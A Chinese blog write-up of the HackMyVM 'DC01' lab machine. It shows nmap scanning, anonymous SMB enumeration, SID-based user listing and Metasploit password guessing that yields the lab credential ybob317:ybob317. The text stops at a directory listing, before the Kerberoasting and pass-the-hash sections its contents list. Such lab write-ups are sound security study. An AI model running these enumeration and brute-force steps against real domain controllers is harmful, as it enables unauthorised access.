<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>HackMyVM-DC01 | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="难度:easy kali:192.168.56.104 靶机:192.168.56.128 &gt; arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: 192.168.56.104 Starting arp-scan 1.10.0 with 256 hosts (https:&#x2F;&#x2F;github.com&#x2F;royh">
<meta property="og:type" content="article">
<meta property="og:title" content="HackMyVM-DC01">
<meta property="og:url" content="https://tao0845.github.io/posts/55ea1c6/index.html">
<meta property="og:site_name" content="ta0的小站">
<meta property="og:description" content="难度:easy kali:192.168.56.104 靶机:192.168.56.128 &gt; arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: 192.168.56.104 Starting arp-scan 1.10.0 with 256 hosts (https:&#x2F;&#x2F;github.com&#x2F;royh">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-07-15T04:20:24.834Z">
<meta property="article:modified_time" content="2024-07-15T07:22:02.424Z">
<meta property="article:author" content="ta0">
<meta property="article:tag" content="SMB用户枚举">
<meta property="article:tag" content="kerberoasting攻击">
<meta property="article:tag" content="PTH攻击">
<meta name="twitter:card" content="summary"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">124</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">16</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">199</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.</span> <span class="toc-text">SMB探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LDAP%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.</span> <span class="toc-text">LDAP探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoasting%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">Kerberoasting攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">PTH攻击</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/55ea1c6/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">HackMyVM-DC01</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-07-15 12:20:24" itemprop="dateCreated datePublished" datetime="2024-07-15T12:20:24+08:00">2024-07-15</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">3.4k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">20m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/HackMyVM/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">HackMyVM</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/SMB%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">SMB用户枚举</span></a><a class="tag-item" href="/tags/kerberoasting%E6%94%BB%E5%87%BB/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">kerberoasting攻击</span></a><a class="tag-item" href="/tags/PTH%E6%94%BB%E5%87%BB/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">PTH攻击</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.128</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:3b:0f:e6       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.128  08:00:27:68:1c:ef       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.930</span> seconds <span class="token punctuation">(</span><span class="token number">132.64</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap -p- <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> <span class="token parameter variable">-sS</span> <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.56.128                                      
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-15 <span class="token number">12</span>:24 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.128
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00020s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65517</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT      STATE SERVICE       VERSION
<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain        Simple DNS Plus
<span class="token number">88</span>/tcp    <span class="token function">open</span>  kerberos-sec  Microsoft Windows Kerberos <span class="token punctuation">(</span>server time: <span class="token number">2024</span>-07-15 <span class="token number">19</span>:26:22Z<span class="token punctuation">)</span>
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
<span class="token number">389</span>/tcp   <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
<span class="token number">464</span>/tcp   <span class="token function">open</span>  kpasswd5?
<span class="token number">593</span>/tcp   <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">636</span>/tcp   <span class="token function">open</span>  tcpwrapped
<span class="token number">3268</span>/tcp  <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token number">3269</span>/tcp  <span class="token function">open</span>  tcpwrapped
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token operator">|</span>_http-title: Not Found
<span class="token number">9389</span>/tcp  <span class="token function">open</span>  mc-nmf        .NET Message Framing
<span class="token number">49664</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49667</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49670</span>/tcp <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">49683</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49702</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:68:1C:EF <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
Device type: general purpose
Running <span class="token punctuation">(</span>JUST GUESSING<span class="token punctuation">)</span>: Microsoft Windows <span class="token number">2022</span><span class="token operator">|</span><span class="token number">11</span><span class="token operator">|</span><span class="token number">2016</span> <span class="token punctuation">(</span><span class="token number">97</span>%<span class="token punctuation">)</span>
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server <span class="token number">2022</span> <span class="token punctuation">(</span><span class="token number">97</span>%<span class="token punctuation">)</span>, Microsoft Windows <span class="token number">11</span> 21H2 <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>, Microsoft Windows Server <span class="token number">2016</span> <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>
No exact OS matches <span class="token keyword">for</span> <span class="token function">host</span> <span class="token punctuation">(</span>test conditions non-ideal<span class="token punctuation">)</span>.
Network Distance: <span class="token number">1</span> hop
Service Info: Host: DC01<span class="token punctuation">;</span> OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="token operator">|</span> smb2-time: 
<span class="token operator">|</span>   date: <span class="token number">2024</span>-07-15T19:27:14
<span class="token operator">|</span>_  start_date: N/A
<span class="token operator">|</span>_clock-skew: 14h59m57s
<span class="token operator">|</span> smb2-security-mode: 
<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
<span class="token operator">|</span>_    Message signing enabled and required
<span class="token operator">|</span>_nbstat: NetBIOS name: DC01, NetBIOS user: <span class="token operator">&lt;</span>unknown<span class="token operator">></span>, NetBIOS MAC: 08:00:27:68:1c:ef <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.20</span> ms <span class="token number">192.168</span>.56.128

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">185.67</span> seconds</code></pre>
<p>开放了很多端口，还有DNS，LDAP,SMB等服务，先从熟悉的SMB看起</p>
<h2 id="SMB探测"><a href="#SMB探测" class="headerlink" title="SMB探测"></a>SMB探测</h2><p>跑一下匿名</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> smbmap <span class="token parameter variable">-H</span>  <span class="token number">192.168</span>.56.128 <span class="token parameter variable">-u</span> anonymous

    ________  ___      ___  _______   ___      ___       __         _______
   /<span class="token string">"       )|"</span>  <span class="token punctuation">\</span>    /<span class="token string">"  ||   _  "</span><span class="token punctuation">\</span> <span class="token operator">|</span><span class="token string">"  \    /"</span>  <span class="token operator">|</span>     /<span class="token string">""</span><span class="token punctuation">\</span>       <span class="token operator">|</span>   __ <span class="token string">"\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /"</span> <span class="token punctuation">\</span>   <span class="token builtin class-name">:</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">||</span><span class="token builtin class-name">:</span> <span class="token operator">|</span>_<span class="token punctuation">)</span>  <span class="token builtin class-name">:</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">|</span> /   /  <span class="token punctuation">\</span>   <span class="token punctuation">\</span>  /<span class="token operator">|</span>__/ <span class="token punctuation">\</span>
  <span class="token punctuation">(</span>_______/  <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>_______/ <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>___/    <span class="token punctuation">\</span>___<span class="token punctuation">)</span><span class="token punctuation">(</span>_______<span class="token punctuation">)</span>
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator <span class="token operator">|</span> Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Detected <span class="token number">1</span> hosts serving SMB
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Established <span class="token number">1</span> SMB session<span class="token punctuation">(</span>s<span class="token punctuation">)</span>                                
                                                                                                    
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> IP: <span class="token number">192.168</span>.56.128:445      Name: <span class="token number">192.168</span>.56.128            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        backup                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
</code></pre>
<p>有共享目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> smbclient  //192.168.56.128/IPC$
Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>root<span class="token punctuation">]</span>:
Try <span class="token string">"help"</span> to get a list of possible commands.
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
NT_STATUS_NO_SUCH_FILE listing <span class="token punctuation">\</span>*
smb: <span class="token punctuation">\</span><span class="token operator">></span> </code></pre>
<p>IPC$可以看但是空的。IPC$启用共享，可以通过lookupsid.py枚举用户</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> lookupsid.py anonymous@192.168.56.128
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

Password:
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Brute forcing SIDs at <span class="token number">192.168</span>.56.128
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> StringBinding ncacn_np:192.168.56.128<span class="token punctuation">[</span><span class="token punctuation">\</span>pipe<span class="token punctuation">\</span>lsarpc<span class="token punctuation">]</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Domain SID is: S-1-5-21-2986980474-46765180-2505414164
<span class="token number">498</span>: SOUPEDECODE<span class="token punctuation">\</span>Enterprise Read-only Domain Controllers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">500</span>: SOUPEDECODE<span class="token punctuation">\</span>Administrator <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">501</span>: SOUPEDECODE<span class="token punctuation">\</span>Guest <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">502</span>: SOUPEDECODE<span class="token punctuation">\</span>krbtgt <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">512</span>: SOUPEDECODE<span class="token punctuation">\</span>Domain Admins <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">513</span>: SOUPEDECODE<span class="token punctuation">\</span>Domain Users <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">514</span>: SOUPEDECODE<span class="token punctuation">\</span>Domain Guests <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">515</span>: SOUPEDECODE<span class="token punctuation">\</span>Domain Computers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">516</span>: SOUPEDECODE<span class="token punctuation">\</span>Domain Controllers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">517</span>: SOUPEDECODE<span class="token punctuation">\</span>Cert Publishers <span class="token punctuation">(</span>SidTypeAlias<span class="token punctuation">)</span>
<span class="token number">518</span>: SOUPEDECODE<span class="token punctuation">\</span>Schema Admins <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">519</span>: SOUPEDECODE<span class="token punctuation">\</span>Enterprise Admins <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">520</span>: SOUPEDECODE<span class="token punctuation">\</span>Group Policy Creator Owners <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">521</span>: SOUPEDECODE<span class="token punctuation">\</span>Read-only Domain Controllers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">522</span>: SOUPEDECODE<span class="token punctuation">\</span>Cloneable Domain Controllers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">525</span>: SOUPEDECODE<span class="token punctuation">\</span>Protected Users <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.</code></pre>
<p>将用户名生成一个字典</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> users.txt <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print substr($2, 13)&#125;'</span> <span class="token operator">></span> username.txt</code></pre>
<p>密码爆破一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_login<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> USER_FILE username.txt
USER_FILE <span class="token operator">=</span><span class="token operator">></span> username.txt
msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_login<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> USER_AS_PASS <span class="token boolean">true</span>
USER_AS_PASS <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span>
msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_login<span class="token punctuation">)</span> <span class="token operator">></span> run

<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Msf::OptionValidateError One or <span class="token function">more</span> options failed to validate: RHOSTS.
msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_login<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> rhost <span class="token number">192.168</span>.56.128
rhost <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.56.128
msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_login<span class="token punctuation">)</span> <span class="token operator">></span> run
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.128:445    - <span class="token number">192.168</span>.56.128:445 - Success: <span class="token string">'.\ybob317:ybob317'</span></code></pre>
<p>拿到一组账号密码<code>ybob317:ybob317</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> smbclient //192.168.56.128/Users <span class="token parameter variable">-U</span> ybob317
Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>ybob317<span class="token punctuation">]</span>:
Try <span class="token string">"help"</span> to get a list of possible commands.
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
  <span class="token builtin class-name">.</span>                                  DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:29 <span class="token number">2024</span>
  <span class="token punctuation">..</span>                                DHS        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:42:50 <span class="token number">2024</span>
  Administrator                       D        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> 03:56:40 <span class="token number">2024</span>
  All Users                       DHSrn        <span class="token number">0</span>  Sat May  <span class="token number">8</span> <span class="token number">16</span>:26:16 <span class="token number">2021</span>
  Default                           DHR        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> <span class="token number">10</span>:51:08 <span class="token number">2024</span>
  Default User                    DHSrn        <span class="token number">0</span>  Sat May  <span class="token number">8</span> <span class="token number">16</span>:26:16 <span class="token number">2021</span>
  desktop.ini                       AHS      <span class="token number">174</span>  Sat May  <span class="token number">8</span> <span class="token number">16</span>:14:03 <span class="token number">2021</span>
  Public                             DR        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> 01:54:32 <span class="token number">2024</span>
  ybob317                             D        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>

                <span class="token number">12942591</span> blocks of size <span class="token number">4096</span>. <span class="token number">10795715</span> blocks available
smb: <span class="token punctuation">\</span><span class="token operator">></span> </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
  <span class="token builtin class-name">.</span>                                  DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:29 <span class="token number">2024</span>
  <span class="token punctuation">..</span>                                DHS        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:42:50 <span class="token number">2024</span>
  Administrator                       D        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> 03:56:40 <span class="token number">2024</span>
  All Users                       DHSrn        <span class="token number">0</span>  Sat May  <span class="token number">8</span> <span class="token number">16</span>:26:16 <span class="token number">2021</span>
  Default                           DHR        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> <span class="token number">10</span>:51:08 <span class="token number">2024</span>
  Default User                    DHSrn        <span class="token number">0</span>  Sat May  <span class="token number">8</span> <span class="token number">16</span>:26:16 <span class="token number">2021</span>
  desktop.ini                       AHS      <span class="token number">174</span>  Sat May  <span class="token number">8</span> <span class="token number">16</span>:14:03 <span class="token number">2021</span>
  Public                             DR        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> 01:54:32 <span class="token number">2024</span>
  ybob317                             D        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>

                <span class="token number">12942591</span> blocks of size <span class="token number">4096</span>. <span class="token number">10795715</span> blocks available
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token builtin class-name">cd</span> ybob317
smb: <span class="token punctuation">\</span>ybob317<span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
  <span class="token builtin class-name">.</span>                                   D        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:32 <span class="token number">2024</span>
  <span class="token punctuation">..</span>                                 DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:29 <span class="token number">2024</span>
